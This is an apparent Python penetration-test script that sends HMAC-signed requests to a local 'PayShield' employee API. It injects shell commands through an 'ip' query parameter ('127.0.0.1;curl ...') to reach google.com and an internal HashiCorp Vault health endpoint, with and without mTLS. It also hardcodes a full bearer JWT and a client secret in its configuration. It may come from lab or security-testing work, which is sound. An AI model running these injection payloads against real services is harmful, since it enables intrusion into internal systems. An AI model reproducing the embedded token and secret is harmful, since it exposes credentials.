import requests
import time
import uuid
import hmac
import hashlib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
BASE_URL = "https://localhost:8888"
# Thay token vào đây
TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIwSGtPQy1TVE1pSE44aGlTZkhBU1p5Z1pUbHpLQXVyMmU0S3VSb291VW5BIn0.eyJleHAiOjE3Nzg1NjQ3NjcsImlhdCI6MTc3ODU2NDQ2NywiYXV0aF90aW1lIjoxNzc4NTY0MTYyLCJqdGkiOiJjZGM3NmYzMy02MzI1LTQxNzEtYWFhOS1mMmU3ZTRhYzhiMzYiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJiZWJiNjk1NC0wZTBmLTQ3ZmMtODkzZS0yNmFmZGY1NjYyNmEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjljZTg4NDAyLWFiOWEtNDBlNy04NmNjLWNkODgwNzAwNmYxNCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImVtcGxveWVlIl19LCJjbmYiOnsieDV0I1MyNTYiOiJ5NEJRWmNRTEJIeVcyQ09wbnA0ejhwWmJTaHM3cy1aemszRG1UczcxVzBBIn0sInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJzaWQiOiI5Y2U4ODQwMi1hYjlhLTQwZTctODZjYy1jZDg4MDcwMDZmMTQiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6Ikh1bmcgTmd1eWVuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIiwiZ2l2ZW5fbmFtZSI6Ikh1bmciLCJmYW1pbHlfbmFtZSI6Ik5ndXllbiIsImVtYWlsIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.I71e1n-PsFdEFWcl3kj4ZwpCbtuVbj7TarVNh4NHyjYZ-QUY-wA8HZ_aVIBPY4AnO0o3TydO1Am1rxyHE5bHfw"
# Thay client secret vào đây
SECRET = "HoHjwBR7aSEJtzQ1DylcppVxZ4CWnVmQ" 

CA = 'kms/ca.crt'
CLIENT = ('kms/client.crt', 'kms/client.key')

def payload(method, uri, ts, nonce, token, secret):
    payload_str = f"{method}|{uri}|{ts}|{nonce}|{token}"
    return hmac.new(secret.encode(), payload_str.encode(), hashlib.sha256).hexdigest()

def send(label, method, uri, use_mtls=True, json_data=None):
    print(f"\n--- {label} ---")
    
    ts = str(int(time.time()))
    nonce = str(uuid.uuid4())
    sig = payload(method, uri, ts, nonce, TOKEN, SECRET)
    
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Timestamp": ts,
        "X-Nonce": nonce,
        "X-Signature": sig,
        "Content-Type": "application/json"
    }
    
    url = f"{BASE_URL}{uri}"
    print(f"Target: {method} {uri}")
    
    cert = CLIENT if use_mtls else None
    
    try:
        response = requests.request(method, url, headers=headers, json=json_data, cert=cert, verify=False, timeout=7)
        print(f"Status: {response.status_code}")
        preview = response.text[:150] + ("..." if len(response.text) > 150 else "")
        print(f"Response: {preview}")
        
        if response.status_code == 200 and len(response.text) > 0:
            print("[!] POTENTIAL SSRF VULNERABILITY CONFIRMED! <<<")
            
    except requests.exceptions.SSLError as e:
        print(f"❌ SSL Error: Khả năng cao do mTLS bị từ chối - {e}")
    except requests.exceptions.Timeout:
        print("❌ Error: Request Timed Out (Có thể mục tiêu nội bộ không phản hồi)")
    except Exception as e:
        print(f"❌ Error: {e}")

# SCENARIO 1: OOB SSRF 
send(
    label="SCENARIO 1: OOB SSRF", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -I https://google.com"
)

# SCENARIO 2: INTERNAL SERVICE 
send(
    label="SCENARIO 2: SSRF TO HASHICORP VAULT", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health"
)

# SCENARIO 3: SSRF WITHOUT mTLS 
send(
    label="SCENARIO 6: SSRF ATTEMPT WITHOUT mTLS", 
    method="GET", 
    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health",
    use_mtls=False
)   